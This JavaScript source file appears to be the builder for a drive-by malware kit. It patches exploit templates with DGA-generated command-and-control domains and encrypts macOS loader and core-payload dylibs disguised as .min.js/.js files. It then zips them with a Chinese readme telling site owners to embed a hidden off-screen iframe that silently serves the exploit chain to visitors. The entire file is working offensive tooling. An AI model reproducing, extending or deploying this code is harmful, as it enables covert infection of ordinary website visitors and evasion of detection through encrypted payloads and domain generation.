import crypto from 'node:crypto';
import path from 'node:path';
import { mkdir, cp, readFile, writeFile, rm, rename, stat } from 'node:fs/promises';
import { ZipArchive } from 'archiver';
import { createWriteStream } from 'node:fs';
import { Channel } from '../../../core/db/models/index.js';
import { generateDgaDomains } from './dga.js';
import { patchLoader } from '../../../core/patch/index.js';
import { patchCorePayload } from '../../../core/patch/index.js';
import { packLoader } from '../../../core/crypto/loader-pack.js';
import { PayloadCrypto } from '../../../core/crypto/seven-zip.js';
import { loadConfig } from '../../../config/index.js';
import { logger } from '../../../core/logger/index.js';
async function assembleChannelZip(params) {
    const { code, primaryDomain, indexDir } = params;
    // 1. Copy exploit templates (old chain)
    const exploitTemplateDir = path.join(process.cwd(), 'templates/exploit');
    await cp(exploitTemplateDir, indexDir, { recursive: true });
    // 2. Patch 34ef entry JS (exploit chain)
    const entryJsPath = path.join(indexDir, '10a3bac758f90cac620daa496b0add8.js');
    let entryContent = await readFile(entryJsPath, 'utf8');
    if (!entryContent.includes('ipsadminuser.shop'))
        throw new Error('34ef entry JS missing ipsadminuser.shop placeholder');
    entryContent = entryContent.replace(/const\s+V\s*=\s*"[^"]*"/, `const V="${code}"`);
    entryContent = entryContent.replace(/ipsadminuser\.shop/g, primaryDomain);
    await writeFile(entryJsPath, entryContent);
    // 3. Patch + encrypt Loader (ChaCha20)
    const loaderTemplatePath = path.join(process.cwd(), 'templates/raw/loader.dylib');
    const loaderRaw = await readFile(loaderTemplatePath);
    const loaderPatched = patchLoader(loaderRaw, { seed: code });
    const loaderEncrypted = await packLoader(loaderPatched);
    if (!loaderEncrypted || loaderEncrypted.length === 0)
        throw new Error('Loader encryption produced empty output');
    await writeFile(path.join(indexDir, '4612aa650e60e2974a9ec37bbf922c79635b493a.min.js'), loaderEncrypted);
}
export async function createChannel(input) {
    const config = loadConfig();
    logger.info({ name: input.name }, 'Channel creation started');
    if (input.seed) {
        if (!/^[0-9a-f]{32}$/.test(input.seed)) {
            throw new Error('seed must be a 32-character hex string');
        }
        const existing = await Channel.findOne({ code: input.seed });
        if (existing)
            throw new Error('seed already used by another channel');
    }
    const code = input.seed || crypto.randomBytes(16).toString('hex');
    const domains = generateDgaDomains(code, 32);
    const primaryDomain = domains[0];
    const channelDir = path.join(config.storageRoot, 'channels', input.name);
    await mkdir(channelDir, { recursive: true });
    const workDir = path.join(config.storageRoot, 'tmp', `channel-${Date.now()}`);
    const zipContentDir = path.join(workDir, code);
    const indexDir = path.join(zipContentDir, 'index');
    await mkdir(indexDir, { recursive: true });
    try {
        await assembleChannelZip({ code, primaryDomain, indexDir });
        logger.info({ name: input.name }, 'Zip content assembled');
        // Generate readme.txt
        const readme = '使用方法：\n1.将index文件夹放到你网站的根目录\n2.以嵌入页面的方式将下面代码放到你网站根目录入口文件里\n <iframe src="/index/index.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>\n';
        await writeFile(path.join(zipContentDir, 'readme.txt'), readme);
        // Create zip
        const zipPath = path.join(channelDir, `${code}.zip`);
        await createZip(workDir, zipPath);
        logger.info({ name: input.name }, 'Zip created');
        // Patch + encrypt CorePayload
        let coreSha256 = '';
        let coreSize = 0;
        const coreTemplatePath = path.join(process.cwd(), 'templates/raw/corepayload.dylib');
        const coreRaw = await readFile(coreTemplatePath);
        const corePatched = patchCorePayload(coreRaw, { seed: code });
        const coreEncPath = path.join(channelDir, 'corepayload.js');
        await PayloadCrypto.encryptBuffer(corePatched, coreEncPath);
        coreSha256 = crypto.createHash('sha256').update(corePatched).digest('hex');
        coreSize = corePatched.length;
        logger.info({ name: input.name, coreSize }, 'CorePayload patched & encrypted');
        // Write DB
        await Channel.create({
            code,
            name: input.name,
            domains,
            primaryDomain,
            corePayloadSha256: coreSha256,
            corePayloadSize: coreSize,
            zipVersion: 2,
        });
        logger.info({ name: input.name, code, primaryDomain }, 'Channel created successfully');
        return {
            code,
            name: input.name,
            domains,
            primaryDomain,
            zipPath: `channels/${input.name}/${code}.zip`,
        };
    }
    finally {
        await rm(workDir, { recursive: true }).catch(() => { });
    }
}
export async function regenerateChannelZip(code) {
    const config = loadConfig();
    const channel = await Channel.findOne({ code });
    if (!channel)
        throw new Error('Channel not found');
    const channelDir = path.join(config.storageRoot, 'channels', channel.name);
    const targetZipPath = path.join(channelDir, `${code}.zip`);
    const workDir = path.join(config.storageRoot, 'tmp', `regen-${code}`);
    const zipContentDir = path.join(workDir, code);
    const indexDir = path.join(zipContentDir, 'index');
    await mkdir(indexDir, { recursive: true });
    let tmpZipPath = '';
    try {
        await assembleChannelZip({ code, primaryDomain: channel.primaryDomain, indexDir });
        const readme = '使用方法：\n1.将index文件夹放到你网站的根目录\n2.以嵌入页面的方式将下面代码放到你网站根目录入口文件里\n <iframe src="/index/index.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>\n';
        await writeFile(path.join(zipContentDir, 'readme.txt'), readme);
        // Build zip in temp location (outside workDir to avoid archiver including it)
        tmpZipPath = path.join(config.storageRoot, 'tmp', `regen-${code}.zip`);
        await createZip(workDir, tmpZipPath);
        // Verify new zip
        const zipStat = await stat(tmpZipPath);
        if (zipStat.size === 0)
            throw new Error('Generated zip is empty');
        // Atomic replace
        await mkdir(channelDir, { recursive: true });
        await rename(tmpZipPath, targetZipPath);
        tmpZipPath = '';
        // Update DB
        await Channel.updateOne({ code }, { $set: { zipVersion: 2, zipRegeneratedAt: new Date() } });
        logger.info({ code, name: channel.name }, 'Channel zip regenerated');
    }
    finally {
        await rm(workDir, { recursive: true }).catch(() => { });
        if (tmpZipPath)
            await rm(tmpZipPath).catch(() => { });
    }
}
function createZip(sourceDir, outputPath) {
    return new Promise((resolve, reject) => {
        const output = createWriteStream(outputPath);
        const archive = new ZipArchive({ zlib: { level: 9 } });
        output.on('close', resolve);
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(sourceDir, false);
        archive.finalize();
    });
}
//# sourceMappingURL=creator.js.map